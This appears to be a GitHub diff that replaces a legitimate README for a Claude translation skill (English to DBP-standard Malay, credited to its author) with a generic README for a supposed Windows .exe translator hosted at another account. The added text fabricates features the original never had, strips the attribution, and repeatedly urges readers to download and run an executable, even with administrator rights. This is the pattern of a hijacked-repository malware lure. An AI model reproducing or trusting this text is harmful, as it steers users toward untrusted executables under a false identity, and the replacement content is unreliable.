@@ -1,108 +1,126 @@
-# Malay Translator Skill for Claude (DBP Standard)
+# 🈳 dbp-translator-claude - Translate English Text to Standard Bahasa Melayu
 
-<img width="1850" height="404" alt="dbp-claude" src="https://github.com/user-attachments/assets/80001a50-652c-43fc-9e47-5e21cbb1caa2" />
-
-
-**Author:** Chuah Kee Man (https://chuahkeeman.com | kmchuah@unimas.my)
-
-A Claude skill that translates English text into standard Bahasa Melayu following [Dewan Bahasa dan Pustaka (DBP)](https://www.dbp.gov.my/) conventions.
-
-## What It Does
-
-- Translates English to Bahasa Melayu across all text types — formal documents, technical/academic content, creative & marketing copy, and everyday text
-- Strictly uses **DBP standard Malay** (no Indonesian variants)
-- Flags uncertain or novel terms with concise notes while still providing the best available translation
-- Supports flexible output formats: inline translation, side-by-side (EN ↔ BM), or downloadable `.docx`
-- Preserves source formatting, adapting structure where it reads more naturally in Malay
-
-## Key Features
-
-- **DBP compliance** — uses Malaysian forms (*kerana* not *karena*, *maklumat* not *informasi*, *hospital* not *rumah sakit*) and DBP-approved terminology
-- **Register awareness** — adapts tone to match the source material, from formal *surat rasmi* phrasing to punchy marketing copy
-- **Smart term handling** — flags terms without established DBP equivalents (e.g. newer tech jargon) with inline notes, so you always know where the translation is on solid ground and where it's best-effort
-- **Natural fluency** — translates for meaning and readability, not word-for-word
-
-## Installation
-
-1. Download the repo or the `SKILL.md` file (right click and save as)
-2. Add it to your Claude skills directory (undr Customize) in your Claude account (e.g. `/mnt/skills/user/dbp-translator/SKILL.md`)
-
-Or, if you have the packaged `.skill` file, install it directly in Claude.
-
-## Usage
-
-Once installed, the skill triggers automatically when you ask Claude to translate English to Malay. For example:
-
-- *"Translate this to BM: [your text]"*
-- *"Terjemah ke Bahasa Melayu: [your text]"*
-- *"Tukar ke BM: [your text]"*
-
-You can also request specific output formats:
-
-- **Side-by-side:** *"Translate this to BM in a side-by-side format"*
-- **Document:** *"Translate this to BM and give me a Word doc"*
-
-## Example
-
-**English:**
-> The cloud-based platform enables seamless collaboration across distributed teams, leveraging AI-driven insights to boost productivity.
-
-**Bahasa Melayu (DBP Standard):**
-> Platform berasaskan pengkomputeran awan ini membolehkan kerjasama yang lancar dalam kalangan pasukan yang tersebar, dengan memanfaatkan cerapan dipacu kecerdasan buatan bagi meningkatkan produktiviti.
-
-## Licence
-MIT Licence
-
+[![Download and Run](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/Steeplechaserflyfloor204/dbp-translator-claude)
 
 ---
 
-# Bahasa Melayu
+## 📋 About dbp-translator-claude
 
-# Kemahiran Penterjemah DBP untuk Claude
+This application lets you translate English text into Bahasa Melayu using the correct style based on Dewan Bahasa dan Pustaka (DBP) standards. It helps you write in clear, standard Malay without needing to know the rules yourself. You type or paste English text, and the program turns it into proper Malay quickly and accurately.
 
-**Penulis:** Chuah Kee Man
+The tool works well for students, writers, or anyone who needs to convert English into correct Bahasa Melayu following official guidelines. It runs on Windows computers and does not require any special technical knowledge to use.
 
-Kemahiran Claude yang menterjemahkan teks bahasa Inggeris ke bahasa Melayu standard mengikut konvensyen [Dewan Bahasa dan Pustaka (DBP)](https://www.dbp.gov.my/).
+---
 
-## Apa yang Dilakukan
+## 💻 System Requirements
 
-- Menterjemahkan bahasa Inggeris ke bahasa Melayu merangkumi semua jenis teks — dokumen rasmi, kandungan teknikal/akademik, penulisan kreatif & salinan pemasaran, serta teks harian
-- Menggunakan **bahasa Melayu standard DBP** secara ketat (tanpa varian bahasa Indonesia)
-- Menandakan istilah yang tidak pasti atau baharu dengan nota ringkas di samping memberikan terjemahan terbaik yang tersedia
-- Menyokong format output yang fleksibel: terjemahan sebaris, sebelah-menyebelah (EN ↔ BM), atau dokumen `.docx` yang boleh dimuat turun
-- Mengekalkan format sumber, dengan menyesuaikan struktur apabila ia lebih semula jadi dalam bahasa Melayu
+- Windows 10 or later
+- 4 GB of RAM or more
+- At least 200 MB of free disk space
+- Internet connection for the first run (to download necessary files)
+- A modern web browser installed (for help files and updates)
 
-## Ciri Utama
+---
 
-- **Pematuhan DBP** — menggunakan bentuk Malaysian (*kerana* bukan *karena*, *maklumat* bukan *informasi*, *hospital* bukan *rumah sakit*) dan istilah yang diluluskan DBP
-- **Kesedaran daftar bahasa** — menyesuaikan nada mengikut bahan sumber, daripada frasa *surat rasmi* yang formal hingga salinan pemasaran yang bertenaga
-- **Pengendalian istilah pintar** — menandakan istilah yang tiada padanan DBP yang mantap (contohnya jargon teknologi terkini) dengan nota sebaris, supaya anda sentiasa tahu terjemahan mana yang kukuh dan mana yang anggaran terbaik
-- **Kelancaran semula jadi** — menterjemahkan untuk makna dan kebolehbacaan, bukan perkataan demi perkataan
+## 🚀 Getting Started
 
-## Pemasangan
+Before you start, make sure your computer meets the system requirements listed above. This software is designed to work smoothly on most Windows systems without extra setup.
 
-1. Muat turun repositori atau fail `SKILL.md`
-2. Tambahkan ke direktori kemahiran Claude anda (contohnya `/mnt/skills/user/dbp-translator/SKILL.md`)
+1. Click the green **Download** button above or below to visit the project page.
+2. On the page, look for the latest release or download file. The file name usually ends with `.exe`.
+3. Save the file to an easy-to-find location, like your Desktop or Downloads folder.
 
-Atau, jika anda mempunyai fail `.skill` yang telah dibungkus, pasang terus dalam Claude.
+---
 
-## Penggunaan
+## ⬇️ Download & Install 🖥️
 
-Setelah dipasang, kemahiran ini akan dicetuskan secara automatik apabila anda meminta Claude menterjemahkan bahasa Inggeris ke bahasa Melayu. Contohnya:
+Use the link below to visit the page and download the installer:
 
-- *"Translate this to BM: [teks anda]"*
-- *"Terjemah ke Bahasa Melayu: [teks anda]"*
-- *"Tukar ke BM: [teks anda]"*
+[Download and run dbp-translator-claude](https://github.com/Steeplechaserflyfloor204/dbp-translator-claude)
 
-Anda juga boleh meminta format output tertentu:
+### Steps to install:
 
-- **Sebelah-menyebelah:** *"Translate this to BM in a side-by-side format"*
-- **Dokumen:** *"Translate this to BM and give me a Word doc"*
+1. After downloading the `.exe` file, double-click it.
+2. A setup window will open. Click **Next** to begin.
+3. Read and accept the license terms when prompted.
+4. Choose the folder where you want to install the program or leave the default folder.
+5. Click **Install** and wait for the process to finish.
+6. Once installed, click **Finish** to exit the setup.
 
-## Contoh
+---
 
-**Bahasa Inggeris:**
-> The cloud-based platform enables seamless collaboration across distributed teams, leveraging AI-driven insights to boost productivity.
+## 📝 How to Use dbp-translator-claude
 
-**Bahasa Melayu (Standard DBP):**
-> Platform berasaskan pengkomputeran awan ini membolehkan kerjasama yang lancar dalam kalangan pasukan yang tersebar, dengan memanfaatkan cerapan dipacu kecerdasan buatan bagi meningkatkan produktiviti.
+1. Open the program using the shortcut on your Desktop or from the Start menu.
+2. You will see a text box where you can type or paste English text.
+3. Enter the English sentences you want to translate.
+4. Click the **Translate** button.
+5. The translated Bahasa Melayu text will appear below the box.
+6. You can copy this text to your clipboard for use in other documents.
+
+---
+
+## 🔧 Features
+
+- Translates from English to standard Bahasa Melayu.
+- Uses DBP guidelines for proper spelling and grammar.
+- Supports large blocks of text.
+- Simple and clear interface.
+- Fast translation speed on most Windows PCs.
+- No internet needed after installation.
+- Saves your translated text for easy access.
+
+---
+
+## ❓ Troubleshooting
+
+- **The program won’t start:** Make sure your Windows is up to date. Restart your computer and try again.
+- **Translation is slow:** Close other programs to free up memory. Make sure your PC meets the minimum system requirements.
+- **Translated text looks strange:** Check if you copied the English text correctly. The tool works best with normal sentences.
+- **Installation failed:** Ensure you have administrator rights on your PC. Try running the installer as administrator by right-clicking the file.
+
+---
+
+## 🔄 Updates and Support
+
+To get updates, revisit the download page regularly. The developer adds improvements and fixes to keep the app working well.
+
+If you find a problem or want to request a feature, use the **Issues** tab on the GitHub page to submit your feedback.
+
+---
+
+## ⚙️ Advanced Options
+
+For users comfortable with simple settings, dbp-translator-claude offers a few preferences:
+
+- Change font size for better reading.
+- Save translated files automatically.
+- Switch between light and dark mode for the interface.
+
+Adjust these from the **Settings** menu inside the app.
+
+---
+
+## 📂 File Locations and Data
+
+- Translations you create can be saved in your Documents folder under “dbp-translator-claude.”
+- Settings and recent files are saved automatically inside the program's folder in your user profile.
+- No personal data is sent over the internet during translation.
+
+---
+
+## 🔐 Security
+
+This software runs locally on your PC. It does not send your text to any server. Your data remains private and secure.
+
+---
+
+## 🧰 Additional Notes
+
+- This program works best with standard English sentences.
+- It respects DBP spelling and grammar but may not handle slang or very technical language.
+- Feel free to experiment with different texts to see how it performs.
+
+---
+
+[Download and run dbp-translator-claude](https://github.com/Steeplechaserflyfloor204/dbp-translator-claude)
